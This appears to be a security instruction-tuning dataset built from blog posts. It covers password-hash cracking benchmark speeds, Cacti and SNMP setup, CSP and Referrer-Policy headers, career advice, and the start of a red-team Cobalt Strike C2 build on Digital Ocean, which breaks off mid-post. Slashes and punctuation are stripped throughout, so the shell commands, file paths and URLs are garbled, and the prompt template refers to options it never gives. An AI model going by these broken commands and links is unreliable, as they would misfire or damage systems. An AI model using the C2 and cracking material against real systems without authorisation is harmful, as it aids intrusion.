Speed.Dev 3 4734.4 MH s 53.13ms Speed.Dev 4 4876.2 MH s 51.57ms Speed.Dev 19229.2 MH s Hashtype Redmine Speed.Dev 1 2047.7 MH s 61.18ms Speed.Dev 2 2005.9 MH s 62.46ms Speed.Dev 3 2000.3 MH s 62.63ms Speed.Dev 4 2049.1 MH s 61.13ms Speed.Dev 8103.0 MH s Hashtype PunBB Speed.Dev 1 2046.3 MH s 61.21ms Speed.Dev 2 2001.3 MH s 62.60ms Speed.Dev 3 2002.7 MH s 62.56ms Speed.Dev 4 2054.3 MH s 60.97ms Speed.Dev 8104.7 MH s Hashtype PostgreSQL Speed.Dev 1 18040.3 MH s 55.77ms Speed.Dev 2 17615.1 MH s 57.12ms Speed.Dev 3 17652.2 MH s 57.01ms Speed.Dev 4 18090.6 MH s 55.61ms Speed.Dev 71398.2 MH s Hashtype MSSQL 2000 Speed.Dev 1 6132.5 MH s 82.04ms Speed.Dev 2 5995.0 MH s 83.93ms Speed.Dev 3 6007.4 MH s 83.76ms Speed.Dev 4 6153.9 MH s 81.75ms Speed.Dev 24288.8 MH s Hashtype MSSQL 2005 Speed.Dev 1 6140.8 MH s 81.94ms Speed.Dev 2 5950.7 MH s 83.90ms Speed.Dev 3 5999.9 MH s 83.87ms Speed.Dev 4 6142.0 MH s 81.90ms Speed.Dev 24233.3 MH s Hashtype MSSQL 2012 2014 Speed.Dev 1 758.9 MH s 82.88ms Speed.Dev 2 744.1 MH s 84.52ms Speed.Dev 3 745.3 MH s 84.38ms Speed.Dev 4 758.7 MH s 82.89ms Speed.Dev 3007.1 MH s Hashtype MySQL323 Speed.Dev 1 37231.7 MH s 52.46ms Speed.Dev 2 37910.3 MH s 53.08ms Speed.Dev 3 37809.2 MH s 53.23ms Speed.Dev 4 38912.7 MH s 51.71ms Speed.Dev 151.9 GH s Hashtype MySQL4.1 MySQL5 Speed.Dev 1 2756.4 MH s 91.28ms Speed.Dev 2 2674.2 MH s 94.08ms Speed.Dev 3 2678.4 MH s 93.93ms Speed.Dev 4 2775.5 MH s 90.63ms Speed.Dev 10884.6 MH s Hashtype Oracle H Type Oracle 7 Speed.Dev 1 719.7 MH s 87.39ms Speed.Dev 2 702.4 MH s 89.54ms Speed.Dev 3 699.1 MH s 89.96ms Speed.Dev 4 730.7 MH s 86.08ms Speed.Dev 2852.0 MH s Hashtype Oracle S Type Oracle 11 Speed.Dev 1 5984.1 MH s 84.08ms Speed.Dev 2 5823.9 MH s 86.40ms Speed.Dev 3 5831.3 MH s 86.29ms Speed.Dev 4 6009.8 MH s 83.71ms Speed.Dev 23649.1 MH s Hashtype Oracle T Type Oracle 12 Speed.Dev 1 78612 H s 97.48ms Speed.Dev 2 76241 H s 50.30ms Speed.Dev 3 76643 H s 50.03ms Speed.Dev 4 79545 H s 96.35ms Speed.Dev 311.0 kH s Hashtype Sybase ASE Speed.Dev 1 212.6 MH s 73.97ms Speed.Dev 2 208.5 MH s 75.40ms Speed.Dev 3 207.8 MH s 75.67ms Speed.Dev 4 215.3 MH s 73.02ms Speed.Dev 844.2 MH s Hashtype Episerver 6.x .NET 4 Speed.Dev 1 5088.4 MH s 49.42ms Speed.Dev 2 4979.7 MH s 50.52ms Speed.Dev 3 4983.6 MH s 50.47ms Speed.Dev 4 5165.4 MH s 48.68ms Speed.Dev 20217.1 MH s Hashtype Episerver 6.x .NET 4 Speed.Dev 1 2075.5 MH s 60.36ms Speed.Dev 2 2032.3 MH s 61.35ms Speed.Dev 3 2033.2 MH s 61.62ms Speed.Dev 4 2090.9 MH s 59.91ms Speed.Dev 8232.0 MH s Hashtype Apache apr1 MD5 md5apr1 MD5 APR Speed.Dev 1 7508.2 kH s 64.25ms Speed.Dev 2 7402.5 kH s 65.38ms Speed.Dev 3 7415.1 kH s 65.03ms Speed.Dev 4 7623.3 kH s 63.44ms Speed.Dev 29949.2 kH s Hashtype ColdFusion 10 Speed.Dev 1 1312.4 MH s 95.85ms Speed.Dev 2 1299.9 MH s 48.38ms Speed.Dev 3 1292.3 MH s 48.66ms Speed.Dev 4 1318.3 MH s 95.42ms Speed.Dev 5222.9 MH s Hashtype hMailServer Speed.Dev 1 2080.5 MH s 60.22ms Speed.Dev 2 2030.1 MH s 61.72ms Speed.Dev 3 2034.9 MH s 61.58ms Speed.Dev 4 2034.4 MH s 59.87ms Speed.Dev 8179.8 MH s Hashtype nsldap SHA-1 Base64 Netscape LDAP SHA Speed.Dev 1 5990.8 MH s 83.99ms Speed.Dev 2 5855.0 MH s 85.94ms Speed.Dev 3 5846.6 MH s 86.05ms Speed.Dev 4 6029.5 MH s 83.44ms Speed.Dev 23721.9 MH s Hashtype nsldaps SSHA-1 Base64 Netscape LDAP SSHA Speed.Dev 1 5953.2 MH s 84.52ms Speed.Dev 2 5857.8 MH s 85.90ms Speed.Dev 3 5854.9 MH s 85.93ms Speed.Dev 4 6013.3 MH s 83.67ms Speed.Dev 23679.3 MH s Hashtype SSHA-256 Base64 LDAP SSHA256 Speed.Dev 1 2331.0 MH s 53.74ms Speed.Dev 2 2289.4 MH s 54.73ms Speed.Dev 3 2285.1 MH s 54.82ms Speed.Dev 4 2346.9 MH s 53.37ms Speed.Dev 9252.4 MH s Hashtype SSHA-512 Base64 LDAP SSHA512 Speed.Dev 1 796.0 MH s 79.00ms Speed.Dev 2 778.3 MH s 80.80ms Speed.Dev 3 775.5 MH s 81.10ms Speed.Dev 4 800.4 MH s 78.57ms Speed.Dev 3150.3 MH s Hashtype LM Speed.Dev 1 13666.9 MH s 73.08ms Speed.Dev 2 12557.0 MH s 80.10ms Speed.Dev 3 12984.0 MH s 77.47ms Speed.Dev 4 12693.5 MH s 79.22ms Speed.Dev 51901.3 MH s Hashtype NTLM Speed.Dev 1 29890.8 MH s 67.33ms Speed.Dev 2 29527.8 MH s 68.16ms Speed.Dev 3 29228.6 MH s 68.85ms Speed.Dev 4 30347.2 MH s 66.31ms Speed.Dev 119.0 GH s Hashtype Domain Cached Credentials DCC MS Cache Speed.Dev 1 8545.0 MH s 58.87ms Speed.Dev 2 8295.0 MH s 60.64ms Speed.Dev 3 8249.5 MH s 60.43ms Speed.Dev 4 8640.5 MH s 58.22ms Speed.Dev 33729.9 MH s Hashtype Domain Cached Credentials 2 DCC2 MS Cache 2 Speed.Dev 1 240.7 kH s 101.38ms Speed.Dev 2 233.6 kH s 51.38ms Speed.Dev 3 234.8 kH s 51.23ms Speed.Dev 4 242.4 kH s 100.85ms Speed.Dev 951.6 kH s Hashtype MS-AzureSync PBKDF2-HMAC-SHA256 Speed.Dev 1 8025.9 kH s 50.16ms Speed.Dev 2 7830.9 kH s 51.30ms Speed.Dev 3 7814.5 kH s 51.06ms Speed.Dev 4 8075.4 kH s 49.75ms Speed.Dev 31746.8 kH s Hashtype descrypt DES Unix Traditional DES Speed.Dev 1 673.4 MH s 93.38ms Speed.Dev 2 658.1 MH s 95.54ms Speed.Dev 3 657.6 MH s 95.60ms Speed.Dev 4 677.1 MH s 92.83ms Speed.Dev 2666.2 MH s Hashtype BSDiCrypt Extended DES Speed.Dev 1 1157.7 kH s 70.25ms Speed.Dev 2 1137.6 kH s 71.57ms Speed.Dev 3 1122.5 kH s 72.54ms Speed.Dev 4 1160.4 kH s 70.15ms Speed.Dev 4578.2 kH s Hashtype md5crypt MD5 Unix Cisco-IOS 1 MD5 Speed.Dev 1 7567.1 kH s 63.93ms Speed.Dev 2 7398.6 kH s 65.41ms Speed.Dev 3 7389.4 kH s 65.49ms Speed.Dev 4 7603.2 kH s 63.62ms Speed.Dev 29958.3 kH s Hashtype bcrypt 2 Blowfish Unix Speed.Dev 1 10818 H s 40.37ms Speed.Dev 2 10668 H s 40.94ms Speed.Dev 3 10542 H s 41.43ms Speed.Dev 4 10847 H s 40.24ms Speed.Dev 42875 H s Hashtype sha256crypt 5 SHA256 Unix Speed.Dev 1 278.8 kH s 87.39ms Speed.Dev 2 272.4 kH s 89.43ms Speed.Dev 3 275.2 kH s 88.52ms Speed.Dev 4 282.3 kH s 86.28ms Speed.Dev 1108.6 kH s Hashtype sha512crypt 6 SHA512 Unix Speed.Dev 1 113.1 kH s 54.82ms Speed.Dev 2 110.3 kH s 56.24ms Speed.Dev 3 109.9 kH s 56.08ms Speed.Dev 4 113.3 kH s 54.72ms Speed.Dev 446.6 kH s Hashtype OSX v10.4 OSX v10.5 OSX v10.6 Speed.Dev 1 5088.6 MH s 49.43ms Speed.Dev 2 4929.3 MH s 51.03ms Speed.Dev 3 4967.6 MH s 50.64ms Speed.Dev 4 5088.0 MH s 49.23ms Speed.Dev 20073.5 MH s Hashtype OSX v10.7 Speed.Dev 1 695.1 MH s 90.48ms Speed.Dev 2 679.9 MH s 92.51ms Speed.Dev 3 684.6 MH s 91.87ms Speed.Dev 4 701.1 MH s 89.70ms Speed.Dev 2760.7 MH s Hashtype OSX v10.8 PBKDF2-SHA512 Speed.Dev 1 9141 H s 97.90ms Speed.Dev 2 8838 H s 50.45ms Speed.Dev 3 8899 H s 50.28ms Speed.Dev 4 9277 H s 96.45ms Speed.Dev 36156 H s Hashtype AIX smd5 Speed.Dev 1 7536.0 kH s 64.20ms Speed.Dev 2 7336.1 kH s 65.97ms Speed.Dev 3 7353.2 kH s 65.81ms Speed.Dev 4 7570.3 kH s 63.89ms Speed.Dev 29795.6 kH s Hashtype AIX ssha1 Speed.Dev 1 33142.8 kH s 52.17ms Speed.Dev 2 32529.7 kH s 53.26ms Speed.Dev 3 32622.0 kH s 53.10ms Speed.Dev 4 33458.6 kH s 51.88ms Speed.Dev 131.8 MH s Hashtype AIX ssha256 Speed.Dev 1 12635.4 kH s 72.85ms Speed.Dev 2 12303.6 kH s 74.86ms Speed.Dev 3 12453.0 kH s 73.86ms Speed.Dev 4 12707.4 kH s 72.42ms Speed.Dev 50099.4 kH s Hashtype AIX ssha512 Speed.Dev 1 4662.2 kH s 95.47ms Speed.Dev 2 4667.9 kH s 49.55ms Speed.Dev 3 4659.5 kH s 49.66ms Speed.Dev 4 4893.7 kH s 94.58ms Speed.Dev 18883.3 kH s Hashtype Cisco-PIX MD5 Speed.Dev 1 11925.8 MH s 84.38ms Speed.Dev 2 11662.9 MH s 86.29ms Speed.Dev 3 11691.4 MH s 86.07ms Speed.Dev 4 12013.6 MH s 83.76ms Speed.Dev 47293.7 MH s Hashtype Cisco-ASA MD5 Speed.Dev 1 13101.1 MH s 76.80ms Speed.Dev 2 12825.5 MH s 78.46ms Speed.Dev 3 12820.1 MH s 78.50ms Speed.Dev 4 13241.3 MH s 75.99ms Speed.Dev 51988.0 MH s Hashtype Cisco-IOS type 4 SHA256 Speed.Dev 1 2322.6 MH s 53.94ms Speed.Dev 2 2265.4 MH s 55.30ms Speed.Dev 3 2270.2 MH s 55.18ms Speed.Dev 4 2335.9 MH s 53.63ms Speed.Dev 9194.1 MH s Hashtype Cisco-IOS 8 PBKDF2-SHA256 Speed.Dev 1 44192 H s 71.03ms Speed.Dev 2 43284 H s 72.53ms Speed.Dev 3 43386 H s 72.25ms Speed.Dev 4 44620 H s 70.33ms Speed.Dev 175.5 kH s Hashtype Cisco-IOS 9 scrypt Speed.Dev 1 12529 H s 612.73ms Speed.Dev 2 12406 H s 618.30ms Speed.Dev 3 12345 H s 621.89ms Speed.Dev 4 12765 H s 600.95ms Speed.Dev 50045"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Install Cacti 1.1.10 on Ubuntu 16.04</title>\n<taxonomies>Author, How-To, Kent Ickler, Cacti, data, go hug a cactus, Kent Ickler, Net Admin, Network monitoring, switches, Ubuntu</taxonomies>\n<creation_date>Wed, 28 Jun 2017 15:43:38 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Kent Ickler What is Cacti Cacti is a network system that inputs system-generated quantifiable data and presents the data in spiffy graphs Net-Admin In the Net-Admin world it gives you time-critical and time-historical data to help you make important decisions Typical data inputs are things like switch-port-utilization environmental information temperature humidity etc system criticals storage space CPU time etc Security-Admin Combined with SIEM and other system data sources Cacti can be used to generate security baseline and normalization patterns It's also a quick sanity check on the network Installing Ubuntu 16.04 We are installing from the ISO ubuntu-16.04.2-server-amd64.iso Complete a the typical setup however ensure that the LAMP package is installed during OS install packet selection You will be prompted to create a MySQL root account password Create the password don't leave it blank keep it handy you'll need it soon when working with mysql and mysqladmin and continue on After installation login Note all those updates we need to do Update Base System sudo -s apt-get update apt-get upgrade reboot -h now Configure Network After the updates are completed setup your network stack Then reboot sudo -s nano etc network interfaces Notes on nano CTRL O to write changes CTRL X to close Update your network settings and reboot once more reboot -h now Note on sudo root Most of the work done from here on out is done at root since most this work is done within opt and installing bits sudo-s Install Pre-Reqs After the reboot login once again We have some pre-req's that need to be installed for Cacti apt-get install php-xml php-ldap php-mbstring php-gd php-snmp php-gmp rrdtool snmp librrds-perl Download Cacti files wget ww.cacti.net downloads cacti-1.1.10.tar.gz tar xvzf cacti-1.1.10.tar.gz mv cacti-1.1.10 opt cacti Setup Log locations mkdir opt logs touch opt logs cacti.log touch opt logs httpd_access.log touch opt logs httpd_error.log chown -R www-data opt logs Configure SQL Database Create cacti database mysqladmin --user root --password create cacti Enter your mysql root password Populate the Cacti database mysql --user root -p cacti opt cacti cacti.sql Enter your mysql root password This process will take a few minutes be patient and wait for the prompt to return Create Timezone tables in SQL mysql_tzinfo_to_sql usr share zoneinfo mysql -u root -p mysql Enter your mysql root password Provision access for the cacti database and the timezone database to the cacti user mysql --user root --password mysql Enter your mysql root password This will enter you into the mysql console for mysql database NOTE 'somepassword referenced here is the cacti user password and must be the same as used in cacti configuration in the next section mysql GRANT ALL ON cacti TO cacti localhost IDENTIFIED BY 'somepassword mysql GRANT SELECT ON mysql.time_zone_name TO cacti localhost IDENTIFIED BY 'somepassword Exit Configure Cacti files Note 'somepassword referenced here is the cacti database user password specified above nano opt cacti include config.php Find these variables and make the following changes database_type 'mysql database_default 'cacti database_hostname 'localhost database_username 'cactiuser database_password somepassword database_port '3306 database_ssl false url_path Set File permissions NOTE After setup is completed the Needed for setup section should be reverted back to your Linux user for security reasons Needed for setup chown -R www-data www-data opt cacti resource snmp_queries chown -R www-data www-data opt cacti resource script_server chown -R www-data www-data opt cacti resource script_queries chown -R www-data www-data opt cacti scripts Needed always chown -R www-data www-data opt cacti rra opt cacti log chown -R www-data www-data opt cacti cache mibcache chown -R www-data www-data opt cacti cache realtime chown -R www-data www-data opt cacti cache spikekill Configure Apache touch etc apache2 sites-available cacti.conf nano etc apache2 sites-available cacti.conf Enter the following and save cacti.conf require all granted ServerAdmin webmaster localhost DocumentRoot opt cacti ErrorLog opt logs httpd_error.log CustomLog opt logs httpd_access.log combined Remove default existing site from Apache rm etc apache2 sites-enabled Enable Cacti site in Apache a2ensite cacti.conf Configure MySQL nano etc mysql mysql.conf.d mysqld.cnf Add following lines to the bottom of the configuration file Max_heap_table_size 380M Tmp_table_size 64M Join_buffer_size 64M Innodb_doublewrite OFF Innodb_buffer_pool_size 1899M Innodb_flush_log_at_timeout 3 Innodb_read_io_threads 32 Innodb_write_io_threads 16 Configure Poller Crontab nano etc crontab Add line at bottom 5 www-data php opt cacti poller.php dev null 2 1 Restart Services service apache2 restart service mysql restart Initiate web-gui install With all of the pre-req's done the web-gui install should go pretty easy The NEXT button is at the bottom left of each page http your-cacti-ip Note Be sure to update the cacti log path to be opt logs cacti.conf Be sure to check all of the available templates for install DONE Login Default login for the first time is USER admin PASSWORD admin You will be prompted to change your password upon first login ____ Check out this follow up post about adding an HP ProCurve Switch to Cacti"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Add an HP ProCurve Switch to Cacti via SSH/Telnet/CLI</title>\n<taxonomies>Author, How-To, Kent Ickler, Cacti, HP ProCurve, Kent Ickler, ProCurve, ProCurve Switch, Switch</taxonomies>\n<creation_date>Wed, 05 Jul 2017 18:55:30 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Kent Ickler In my recent post we installed and got Cacti up and running Now we're going to add our first switch into Cacti's services Switch This is an HP-Procurve line switch Because we're going to configure the switch from the command line the general configuration will apply to multiple models within the ProCurve line The Web-Interface could also be used The general configuration necessary is to enable SNMP services on the switch The SNMP services will be listening on the switch's management interface IP I make the assumption that you already have configured the switch to have an IP address on your management network Additionally I make the assumption you can access the switch's CLI via SSH Telnet or Serial SNMP Strings SNMPv1 Caution SNMPv1 allows a simple SNMP query to the SNMP service These queries are not encrypted but also are not complicated to setup We'll cover V2 and V3 later Your SNMP read string shouldn't be the default read come up with something more clever This string is used to authenticate the SNMP agent cacti to the SNMP service on the switch to query information In this example we are using SomeReadString Configure SNMP on Switch SSH or telnet or serial into the HP Procurve switch Enable Config Snmp-server community SomeReadString Snmp-server contact TheAdmin YourDomain.com End Write Memory Add the Device switch to Cacti Login to Cacti and click on Devices Click on Add Enter Description Name the switch in Cacti Enter Hostname The IP of the switch Device Template Net-SNMP Device SNMP Version 1 SNMP Community Your Read string from above SomeReadString Press Create at the bottom Create Graphs in Cacti for the Device After pressing create if everything is configured properly information for the switch will imediately populate followed by additional options Click on Create Graphs for this Device Scroll down to the Data Query SNMP Interface Statistics Section Select each interface that you would like to graph or select all of the graphs Change the graph type to In Out bytes with Total Bandwidth Then click on Create at the bottom There may be a delay after clicking Create Add the Device to the Graphs-Tree Next click on Tree in the left navigation panel Select press the name Default Tree to enter the management of the Default Tree for graphs In the Edit Tree section drag the new HPSwitch you created into the Tree Items column When dragging the item over place it directly above or below any existing entries Then press Save Now click on the Graphs tab at the top of the screen followed by the Device you just created You may see some errors as the population of the graphs can take a few moments Within 10 minutes you begin to see data populate on the graphs Quick Bonus HP Procurve 1920 GUI SNMP Configuration Login to the switch web-GUI click on SNMP under Device Select SNMP Enabled SNMP v1 Save Then select the community tab and add a new Read string for your SNMP service The remainder follows the above Links Installing Cacti 1.1.10 on Ubuntu 16.04"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How To Fix a Missing Content-Security-Policy on a Website</title>\n<taxonomies>Author, How-To, Kent Ickler, Content Security Policy, Kent Ickler, Scott Helme, Security Headers, web page, web site, web site configuration</taxonomies>\n<creation_date>Mon, 17 Jul 2017 15:20:19 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Kent Ickler Content-Security-Policy-What-What Content-Security-Policy is a security header that can and should be included on communication from your website's server to a client When a user goes to your website headers are used for the client and server to exchange information about the browsing session This is typically all done in the background unbeknownst to the user Some of those headers can change the user experience and some such as the Content-Security-Policy affect how the web-browser will handle loading certain resources like CSS files javascript images etc on the web page Content-Security-Policy tells the web-browser what resource locations are trusted by the web-server and is okay to load If a resource from an untrusted location is added to the webpage by a MiTM or in dynamic code the browser will know that the resource isn't trusted and will fail to process that resource Check if you have Content-Security-Policies already enabled If you haven't heard of these headers before you probably don't have them enabled They aren't automatic A quick way to check is to go to www.securityheaders.io and do a scan of your website You can also check in FireFox's Developer Console Identifying Your Trusted Sources In our case we needed to identify trusted resource sources This was pretty easy to do with Developer Mode in FireFox We loaded our web page set the Content-Security-Policy and saw how many errors the console in the Developer Panel created Each error was a violation of our Content-Security-Policy We used that information to include additional sources in our policy until all our content loaded appropriately Consult with your web-developers as they may be able to provide you a list of all the source locations that should be trusted Create and Configure the Content-Security-Policy in Apache The header we need to add will be added in the httpd.conf file alternatively apache.conf etc In httpd.conf find the section for your VirtualHost Next find your section If it doesn't exist you will need to create it and add our specific headers Bits of important stuff here RequestHeader set X-HTTPS 1 Header set Content-Security-Policy default-src 'self 'unsafe-inline www.blackhillsinfosec.com fonts.googleapis.com more bits of important stuff Restart Apache Sudo service apache restart Test that change Wow looks like we still have some sources we need trust Note the sections highlighted Update that Header Set with a Few More Sources Header set Content-Security-Policy default-src 'self 'unsafe-inline www.blackhillsinfosec.com fonts.googleapis.com fonts.static.com www.google-analytics.com Don't forget to restart Apache after your change Soon you'll have your page configured properly with Content-Security-Policies and trusted sources Note the resource errors in the FireFox developer's console is now clear after refreshing Header Set Content-Security-Policy Scott Helme Scott_Helme has done a significant amount of research and helped pave the way for web-devs to fully implement Content-Security-Policies Here is some great content that Scott has put together to assist in the proper implementation of Content-Security-Policies Content Security Policy Introduction Link cotthelme.co.uk content-security-policy-an-introduction Content Security Policy Cheat Sheet Link cotthelme.co.uk csp-cheat-sheet Soon Configuring Referral-Policy"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How To Fix a Missing Referrer-Policy on a Website</title>\n<taxonomies>Author, How-To, Kent Ickler, How to fix a referrer policy, Kent Ickler, Referrer Policy, Scott Helme, Security Headers</taxonomies>\n<creation_date>Wed, 19 Jul 2017 15:37:33 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Kent Ickler Referrer-Policy What-What Referrer-Policy is a security header that can and should be included on communication from your website's server to a client The Referrer-Policy tells the web browser how to handle referrer information that is sent to websites when a user clicks a link that leads to another page or website The Referrer-Policy can be configured to cause the browser to not inform the destination site any URL information some information or a full URL path Having a policy set is good practice The policy can be set a number of ways including in website code PHP etc Below we will be configuring the Referrer-Policy header in Apache configuration Check If Referrer-Policy Is Enabled If you haven't heard of these headers before you probably don't have them enabled They aren't automatic though they may have been included in webapps you've installed WordPress Joomla etc A quick way to check is to go to www.securityheaders.io and do a scan of your website You can also check in FireFox's Developer Console Identifying Your Referrer Needs When a user leaves your website from a link that points elsewhere it may be useful for the destination server to know where the user came from your website It might also be more appropriate that you don't tell them any information about your website The referrer header that is sent is typically a string that includes the URL of the page that the user clicked the link to the destination There are multiple ways to configure if and what information is sent but things to keep in mind are referrers may be necessary to properly configure web advertisements analytics and some authentication platforms You can also ensure that an HTTPS URL is not leaked into HTTP headers and consequently leaking website path information unencrypted across the internet In our case we find the no-referrer-when-downgrade policy to meet our needs This will ensure that if a user clicks a link to an HTTP website not secure the web browser will not post our HTTPS URL path this would be a security data leak as it discloses our URL path scheme unencrypted across the internet Specific policy options can be found in a link at the bottom of this post Create and configure the Referrer-Policy in Apache The header we need to add will be added in the httpd.conf file alternatively apache.conf etc In httpd.conf find the section for your VirtualHost Next find your section If it doesn't exist you will need to create it and add our specific headers Bits of important stuff here RequestHeader set X-HTTPS 1 Header set Referrer-Policy no-referrer-when-downgrade more bits of important stuff Restart Apache sudo service apache restart Test the change Header Set Content-Security-Policy Scott Helme has done a significant amount of research and helped pave the way for web devs to fully implement Referrer-Policy Here is some great content that Scott has put together to assist in proper implementation A new security header Referrer Policy Link cotthelme.co.uk a-new-security-header-referrer-policy SecurityHeaders.io Link ww.securityheaders.io Related See Part 1 How to Configure Content-Security-Policy"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Get into Information Security</title>\n<taxonomies>InfoSec 101, Career in Infosec, Dreams, How to get into infosec</taxonomies>\n<creation_date>Wed, 26 Jul 2017 14:30:39 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Dear BHIS So I'm a big fan of you guys I took John's SANS504 OnDemand class and I saw the light Now what I want to get into security maybe because I want to torture myself but how How do I make the next step How do I get into infosec Also are you guys hiring Tortured Dear Tortured No sorry we're not hiring right now but let's back up to the heart of your question Infosec is a fairly new field and we're still all figuring things out as we go it truly is the Wild West full of possibility danger and craziness But you're on the right track keep educating yourself Degrees and certifications are good but there's lots of education in this industry that's free and easily accessible If you're super serious about wanting to get into information security go find yourself a job as part of a Blue Team Try a small shop where you might get to do a little more and have more voice 1 It might seem like going backward to be doing IT for mom and pop shops but this is where security is the most vulnerable and you'll probably realize you know a lot more than you think Nothing will help the rubber meet the road quite like having a place to try things out and understand what needs to be fixed If you're at a larger place you might not get to be in a role where you make decisions This will give you a lot of knowledge down the road If you become a pen tester at some point in your career having blue team experience will be invaluable to you and your employer This is probably a good place to learn to networking the foundation of all communications you can't hack if you don't understand TCP IP UDP and the fundamentals of switching routing ACLs and sockets When you learn to blue team figure out how to break your own work and then fix it again Here are some blogs and other resources we've also found helpful -John's classic Infosec Basics Fundamentals ww.blackhillsinfosec.com ?p 4663-Derek talks about some general ideas Developing Hacking Kung Fu or How To Get Into Information Security ww.blackhillsinfosec.com ?p 4655 Here's a whole list of other starting in infosec blog posts oom362.com start If watching videos is more your style our website has a wealth of webcasts and conference talks we've done Watch them And sign up for our webcasts Here's the gist of what John says when we overhear him talk to people Learn to code in Python use Linux somewhere play with sed and awk There are BSides conferences everywhere These are smaller intimate places to hear and meet like-minded infosec people If you have time volunteer You will feel like a n00b everyone does After a few times attending submit a talk and then submit another talk You also might start a Twitter account and engage with it Twitter is one of those things where it remains what you make it If you're building it expressly to learn more about infosec keep it focused don't rabbit hole down your other interests Follow people in the security industry and pay attention to what's going on This is the best and cheapest way to build your own threat intelligence feed 2 Find someone you like and look at their lists that's a great way to start to know who's who and what's happening in infosec Check out Ethan Robish's list We live in an age when people can actually be involved and be doing the things they say they want to do in their careers You want to be in infosec Don't wait for someone to hire you or make your dreams come true for you start building them yourself Keep us posted and good luck in all your future endeavors With Love Black Hills Information Security ____ We saw this tweet as we were writing this response couldn't agree more witter.com highmeh status 887553361737691136 Thanks highmeh Yes 0daySimpson"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Build a C2 Infrastructure with Digital Ocean - Part 1</title>\n<taxonomies>How-To, Blue Team, blue teaming, C2, C2 Infrastructure, Digital Ocean, Let's Encrypt, pen-testing, penetration testing, Red Team, red teaming, SSH configuration</taxonomies>\n<creation_date>Mon, 24 Jul 2017 13:21:52 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Lee Kagan Deploying an offensive infrastructure for red teams and penetration tests can be repetitive and complicated One of my roles on our team is to build-out and maintain the red team systems and control accesses to and from them There's an endless variety of what you may wish to deploy but I found I was consistently repeating the same baseline deployment In the cat and mouse game of red vs blue there are challenges for both sides with regards to successfully launching an offensive and successfully defending against one For red teams and as our team infrastructure handler the following items are my concerns Stability The general system performance and reliable communications channels and accesses Security OPSEC and defenses against investigators blue teams Functionality Add remove modify features and capabilities as the team requires The Red Team Infrastructure wiki is a great example and resource of this exact concept You can read more at ithub.com bluscreenofjeff Red-Team-Infrastructure-Wiki Here I'll cover using Digital Ocean with Cobalt Strike team servers in a semi-automated fashion that is the beginning of a more complex and automated process and tooling I hope to release shortly in part 2 For now this should serve as a good starting place What we're going build 3 Digital Ocean droplets for the different roles our team servers play Cobalt Strike Customize the SSH configuration Server health monitoring Firewall access to and from the team servers Let's Encrypt for HTTPS beacons Here are the things you'll need in advance Cobalt Strike license or trial version Can replace this with MSF or Empire etc Digital Ocean account C2K Files ithub.com invokethreatguy C2K DNS configuration access for your domain s Will need to set DNS A records The infrastructure we are going to set up will do the following mostly scripted Deploy our droplets via Digital Ocean web UI SSH into each and add new sudo user add SSH keys and transfer the C2K files Restrict SSH access to the new user with keys only Run the C2K builder script which will Update the system Install lterm for console logging Much thanks to KillswitchGUI for this tool ithub.com killswitch-GUI Install Java dependencies for Cobalt Strike Activate Cobalt Strike Replace current SSH config with custom file Create firewall rules Run HTTPsC2DoneRight.sh Much thanks to KillswitchGUI for this tool ithub.com killswitch-GUI Let's begin The Steps Log in to your Digital Ocean control panel As you can see I have no droplets yet so let us go through the steps We're going to create three droplets The settings that I'm using are Ubuntu 14.04 for the OS and the 40 per month pricing I don't recommend going 